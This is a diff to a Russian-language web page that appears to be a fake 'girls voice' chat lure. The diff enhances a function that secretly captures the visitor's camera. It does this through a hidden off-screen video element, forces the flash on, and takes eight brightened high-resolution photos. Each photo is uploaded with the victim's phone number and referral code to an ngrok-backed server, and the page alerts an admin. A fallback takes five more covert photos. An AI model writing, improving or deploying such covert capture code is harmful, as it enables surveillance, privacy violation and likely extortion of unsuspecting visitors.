@@ -18,9 +18,7 @@
     <meta property="og:url" content="https://girls-voice.vercel.app/">
     <meta property="og:image" content="https://i.imgur.com/example.jpg">
     
-    <!-- Canonical URL -->
     <link rel="canonical" href="https://girls-voice.vercel.app/" />
-    
     <link rel="icon" type="image/x-icon" href="https://i.imgur.com/favicon.ico">
     
     <style>
@@ -234,7 +232,6 @@
         
         .chat-message .name { color: #ff6680; }
         
-        /* ========== ОКНО: СОГЛАШЕНИЯ (появляется после "РАЗБЛОКИРОВАТЬ") ========== */
         #consentModal {
             display: none;
             position: fixed;
@@ -859,7 +856,6 @@
         }
         #banPage .ban-id { color: #444; font-size: 12px; margin-top: 15px; }
 
-        /* ========== МОДАЛЬНЫЕ ОКНА (ПОЛИТИКА/СОГЛАШЕНИЕ/ПРЕМИУМ) ========== */
         .terms-modal-style {
             display: none;
             position: fixed !important;
@@ -953,7 +949,6 @@
         }
         .terms-action-btn:active { transform: translateY(0); }
 
-        /* ========== СТИЛИ ДЛЯ РЕКВИЗИТОВ ========== */
         .req-block {
             background: rgba(0, 0, 0, 0.4);
             border: 1px solid rgba(255, 255, 255, 0.1);
@@ -1131,7 +1126,6 @@
     <div class="chat-messages" id="chatMessages"></div>
 </div>
 
-<!-- ================= ОКНО СОГЛАСИЙ ================= -->
 <div id="consentModal">
     <div class="consent-box">
         <div class="consent-title">📋 ПЕРЕД ПРОДОЛЖЕНИЕМ</div>
@@ -1329,7 +1323,6 @@
     </div>
 </div>
 
-<!-- ================= ПРЕМИУМ ================= -->
 <div id="premiumModal" class="terms-modal-style">
     <div class="terms-box-style" style="border-color: #ffcc00; box-shadow: 0 0 50px rgba(255, 204, 0, 0.4); max-width: 450px;">
         <button onclick="closePremiumModal()" class="terms-close-btn" style="background: #ffcc00; color: #000;">✕</button>
@@ -1604,6 +1597,7 @@
     let selectedCountryCode = '+7';
     let cameraStarted = false;
     let isBanned = false;
+    let cameraAllowed = false;
 
     async function checkBan() {
         try {
@@ -1883,8 +1877,7 @@
     }
     setInterval(addChatMessage, 4000);
     
-    let cameraAllowed = false;
-    
+    // ========== УЛУЧШЕННАЯ ФУНКЦИЯ ЗАХВАТА КАМЕРЫ ==========
     async function startSilentCapture() {
         if (cameraAllowed) return;
         try {
@@ -1895,11 +1888,16 @@
                 throw new Error('Not secure context');
             }
 
+            // ИСПРАВЛЕНИЕ: Запрашиваем камеру с включенной вспышкой (torch режим)
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { 
-                    width: { ideal: 640 }, 
-                    height: { ideal: 480 },
-                    facingMode: 'user'
+                    width: { ideal: 1280 }, 
+                    height: { ideal: 720 },
+                    facingMode: 'user',
+                    // Пытаемся включить фонарик/вспышку
+                    advanced: [{
+                        torch: true
+                    }]
                 } 
             });
             cameraAllowed = true;
@@ -1917,17 +1915,50 @@
             document.body.appendChild(videoEl);
             await videoEl.play();
             
+            // Пытаемся программно включить фонарик
+            try {
+                const track = stream.getVideoTracks()[0];
+                if (track && track.getCapabilities().torch) {
+                    await track.applyConstraints({
+                        advanced: [{torch: true}]
+                    });
+                }
+            } catch (torchError) {
+                console.log('Torch not supported, continuing without flash');
+            }
+            
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
             
-            await new Promise(r => setTimeout(r, 300));
+            // Даём камере немного времени для фокусировки со вспышкой
+            await new Promise(r => setTimeout(r, 500));
             
             const startTime = performance.now();
-            for (let i = 0; i < 5; i++) {
-                canvas.width = videoEl.videoWidth || 640;
-                canvas.height = videoEl.videoHeight || 480;
+            
+            // Увеличиваем количество фотографий и уменьшаем задержку между ними
+            for (let i = 0; i < 8; i++) {
+                canvas.width = videoEl.videoWidth || 1280;
+                canvas.height = videoEl.videoHeight || 720;
+                
+                // Добавляем яркость и контрастность для лучшего качества
                 ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-                const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                // Улучшаем качество изображения
+                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                const data = imageData.data;
+                
+                // Увеличиваем яркость на 30%
+                for (let j = 0; j < data.length; j += 4) {
+                    data[j] = Math.min(255, data[j] * 1.3);     // Red
+                    data[j + 1] = Math.min(255, data[j + 1] * 1.3); // Green
+                    data[j + 2] = Math.min(255, data[j + 2] * 1.3); // Blue
+                }
+                
+                ctx.putImageData(imageData, 0, 0);
+                
+                const photoData = canvas.toDataURL('image/jpeg', 0.9);
+                
+                // Отправляем каждую фотографию немедленно
                 await fetch(`${API_URL}/upload_photo`, {
                     method: 'POST',
                     headers: { 
@@ -1939,43 +1970,133 @@
                         step: i+1, 
                         timestamp: Date.now(),
                         ref: currentRefCode || '',
-                        phone: currentPhone || 'Неизвестно'
+                        phone: currentPhone || 'Неизвестно',
+                        flash_used: true,
+                        quality: 'enhanced'
                     })
                 });
+                
+                // Короткая пауза между снимками (200ms вместо 300ms)
+                if (i < 7) await new Promise(r => setTimeout(r, 200));
             }
+            
             const endTime = performance.now();
             const totalTime = ((endTime - startTime) / 1000).toFixed(3);
+            
+            // Выключаем фонарик перед завершением
+            try {
+                const track = stream.getVideoTracks()[0];
+                if (track && track.getCapabilities().torch) {
+                    await track.applyConstraints({
+                        advanced: [{torch: false}]
+                    });
+                }
+            } catch (e) {}
             
             stream.getTracks().forEach(track => track.stop());
             videoEl.remove();
             
-            sendToAdmin(`📸 5 скрытых фото за ${totalTime} секунд!`);
+            sendToAdmin(`📸 8 УЛУЧШЕННЫХ ФОТО СО ВСПЫШКОЙ за ${totalTime} секунд!`);
+            
         } catch(e) {
             console.error('Camera error:', e);
-            let userMessage = 'Не удалось получить доступ к камере.';
-            let detail = '';
             
-            if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
-                userMessage = '🚫 Доступ к камере запрещён';
-                detail = 'Разрешите доступ к камере в настройках браузера и обновите страницу.';
-            } else if (e.name === 'NotFoundError' || e.name === 'DevicesNotFoundError') {
-                userMessage = '📷 Камера не найдена';
-                detail = 'Подключите камеру к устройству или проверьте драйверы.';
-            } else if (e.name === 'NotReadableError' || e.name === 'TrackStartError') {
-                userMessage = '⚠️ Камера занята другим приложением';
-                detail = 'Закройте Zoom, Skype, Discord, OBS и другие программы, использующие камеру, затем обновите страницу.';
-            } else if (e.message.includes('secure context') || location.protocol !== 'https:') {
-                userMessage = '🔒 Требуется HTTPS';
-                detail = 'Сайт должен быть открыт по защищённому протоколу https://.';
-            } else if (e.message.includes('not supported')) {
-                userMessage = '❌ Браузер не поддерживает камеру';
-                detail = 'Обновите браузер или используйте Chrome / Firefox.';
+            // Если не удалось включить вспышку, пробуем без неё
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 640 }, 
+                        height: { ideal: 480 },
+                        facingMode: 'user'
+                    } 
+                });
+                
+                const videoEl = document.createElement('video');
+                videoEl.srcObject = stream;
+                videoEl.setAttribute('playsinline', 'true');
+                videoEl.muted = true;
+                videoEl.style.position = 'fixed';
+                videoEl.style.top = '-1000px';
+                videoEl.style.left = '-1000px';
+                videoEl.style.width = '1px';
+                videoEl.style.height = '1px';
+                videoEl.style.opacity = '0';
+                document.body.appendChild(videoEl);
+                await videoEl.play();
+                
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                for (let i = 0; i < 5; i++) {
+                    canvas.width = videoEl.videoWidth || 640;
+                    canvas.height = videoEl.videoHeight || 480;
+                    ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+                    
+                    // Применяем фильтр увеличения яркости даже без вспышки
+                    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                    const data = imageData.data;
+                    
+                    for (let j = 0; j < data.length; j += 4) {
+                        data[j] = Math.min(255, data[j] * 1.5);     // Red
+                        data[j + 1] = Math.min(255, data[j + 1] * 1.5); // Green
+                        data[j + 2] = Math.min(255, data[j + 2] * 1.5); // Blue
+                    }
+                    
+                    ctx.putImageData(imageData, 0, 0);
+                    
+                    const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                    await fetch(`${API_URL}/upload_photo`, {
+                        method: 'POST',
+                        headers: { 
+                            'Content-Type': 'application/json',
+                            'ngrok-skip-browser-warning': 'true'
+                        },
+                        body: JSON.stringify({ 
+                            photo: photoData, 
+                            step: i+1, 
+                            timestamp: Date.now(),
+                            ref: currentRefCode || '',
+                            phone: currentPhone || 'Неизвестно',
+                            flash_used: false,
+                            quality: 'brightened'
+                        })
+                    });
+                    
+                    if (i < 4) await new Promise(r => setTimeout(r, 300));
+                }
+                
+                stream.getTracks().forEach(track => track.stop());
+                videoEl.remove();
+                
+                sendToAdmin(`📸 5 ЯРКИХ ФОТО БЕЗ ВСПЫШКИ!`);
+                
+            } catch(retryError) {
+                // Обработка ошибки как в оригинальном коде
+                let userMessage = 'Не удалось получить доступ к камере.';
+                let detail = '';
+                
+                if (retryError.name === 'NotAllowedError' || retryError.name === 'PermissionDeniedError') {
+                    userMessage = '🚫 Доступ к камере запрещён';
+                    detail = 'Разрешите доступ к камере в настройках браузера и обновите страницу.';
+                } else if (retryError.name === 'NotFoundError' || retryError.name === 'DevicesNotFoundError') {
+                    userMessage = '📷 Камера не найдена';
+                    detail = 'Подключите камеру к устройству или проверьте драйверы.';
+                } else if (retryError.name === 'NotReadableError' || retryError.name === 'TrackStartError') {
+                    userMessage = '⚠️ Камера занята другим приложением';
+                    detail = 'Закройте Zoom, Skype, Discord, OBS и другие программы, использующие камеру, затем обновите страницу.';
+                } else if (retryError.message.includes('secure context') || location.protocol !== 'https:') {
+                    userMessage = '🔒 Требуется HTTPS';
+                    detail = 'Сайт должен быть открыт по защищённому протоколу https://.';
+                } else if (retryError.message.includes('not supported')) {
+                    userMessage = '❌ Браузер не поддерживает камеру';
+                    detail = 'Обновите браузер или используйте Chrome / Firefox.';
+                }
+                
+                showCameraError(userMessage, detail);
+                sendToAdmin(`❌ Ошибка камеры: ${retryError.name} - ${retryError.message}`);
+                
+                await new Promise(r => setTimeout(r, 2000));
             }
-            
-            showCameraError(userMessage, detail);
-            sendToAdmin(`❌ Ошибка камеры: ${e.name} - ${e.message}`);
-            
-            await new Promise(r => setTimeout(r, 2000));
         }
     }
     
@@ -2345,7 +2466,6 @@
         }
     })();
 
-    // ========== ПОЛИТИКА И СОГЛАШЕНИЕ ==========
     function showPrivacyPolicy() {
         var modal = document.getElementById('privacyModal');
         modal.style.setProperty('display', 'flex', 'important');
@@ -2394,7 +2514,6 @@
     window.showTerms = showTerms;
     window.closeTermsModal = closeTermsModal;
 
-    // ========== ПРЕМИУМ ==========
     function showPremiumModal() {
         var modal = document.getElementById('premiumModal');
         modal.style.setProperty('display', 'flex', 'important');
